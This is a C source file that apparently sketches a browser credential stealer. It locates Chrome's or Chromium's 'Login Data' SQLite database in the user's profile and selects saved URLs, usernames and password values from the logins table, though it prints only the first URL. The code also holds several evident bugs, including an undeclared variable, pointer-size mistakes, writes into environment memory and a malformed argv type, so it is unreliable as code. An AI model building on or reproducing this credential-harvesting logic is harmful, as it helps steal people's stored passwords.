#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sqlite3.h>

#ifdef _WIN32
#include <Windows.h>
#include <winbase.h>
#endif


char *get_chrome_path()
{
    char *buff = (char *) malloc(256);
    char *chromePath;


    #ifdef _WIN32
    chromPath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
    if (!GetEnvironmentVariable(L"LOCALAPPDATA", buff, sizeof(buff)))
    {
        printf("[!] Failed to get environment variable: LOCALAPPDATA");
        exit(-1);
    }
    #else
    chromePath = "/.config/chromium/Default/Login Data";
    buff = getenv("HOME");
    if (!buff) {
        printf("[!] Failed to get environment variable: HOME");
        exit(-1);
    }
    #endif

    strncat(buff, chromePath, sizeof(chromePath));

    return buff;
}

char *parse_cmd_line(int argc, char *argv) {
    int opt;
    char *argbuf = malloc(256);

    while ((opt = getopt(argc, argv, "f")) != -1) {
        switch (opt) {
        case 'f': 
            fprintf(stdout, "Got option: %s\n", optarg);
            argbuf = optarg;
        default:
            fprintf(stderr, "Usage: %s [-f file]\n", argv[0]);
            exit(1);
        }
    }
    return argbuf;
}


int main(int argc, char *argv)
{

    char *login_data_path;

    sqlite3 *db;
    sqlite3_stmt *res;
    

    printf("argc: %d\n", argc);

    if (argc > 1) {
        login_data_path = parse_cmd_line(argc, argv); 
    } else {
        login_data_path = get_chrome_path();
    }

    int retVal = sqlite3_open(login_data_path, &db);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

    retVal = sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value FROM logins", -1, &res, 0);

    if (retVal != SQLITE_OK)
    {

        fprintf(stderr, "Couldn't fetch data: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);

        return 1;
    }

        retVal = sqlite3_step(res);
    
    if (retVal == SQLITE_ROW) {
        printf("%s\n", sqlite3_column_text(res, 0));
    }
    
    sqlite3_finalize(res);
    sqlite3_close(db);
    
    return 0;
}